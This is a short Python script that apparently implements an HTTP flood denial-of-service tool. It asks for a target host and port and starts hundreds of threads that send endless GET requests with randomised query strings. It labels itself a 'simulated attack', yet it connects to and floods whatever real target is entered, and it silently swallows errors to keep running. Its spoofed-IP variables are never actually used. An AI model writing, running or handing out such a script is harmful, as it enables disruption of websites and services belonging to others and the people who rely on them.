import socket
import threading
import sys
from random import randint
import time
# Get user input for target and port
target = input("Enter target website/IP: ")
port = int(input("Enter port number (default=80): ") or 80)
fake_ip = "182.21.20.32"  # Fake IP (not used for real spoofing)
spoofed_ip = f"{randint(0,255)}.{randint(0,255)}.{randint(0,255)}.{randint(0,255)}"
def generate_headers():
    """Generates realistic HTTP request headers."""
    headers = [
        "User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language: en-US,en;q=0.9",
        "Connection: close",
        f"Host: {target}",
    ]
    return "\r\n".join(headers)
def attack():
    """Sends a simulated HTTP GET request with random spoofed IP and delay."""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            
            # Add delay between requests to simulate realistic traffic
            time.sleep(randint(1, 3))
            request = f"GET /?{randint(0, 1000)} HTTP/1.1\r\n"
            request += generate_headers() + "\r\n"
            s.send(request.encode())
            s.close()
        except KeyboardInterrupt:
            print("\n[!] Stopping attack...")
            sys.exit()
        except Exception as e:
            pass  # Ignore errors to prevent script crash
# Start multiple threads
thread_count = int(input("Enter number of threads (default=500): ") or 500)
print(f"\nStarting {thread_count} threads...")
try:
    for _ in range(thread_count):
        thread = threading.Thread(target=attack)
        thread.daemon = True  # Ensures threads stop when the script stops
        thread.start()
    print("Simulated attack started. Press Ctrl+C to stop.")
    while True:
        pass
except KeyboardInterrupt:
    print("\n[!] Script stopped by user.")
    sys.exit()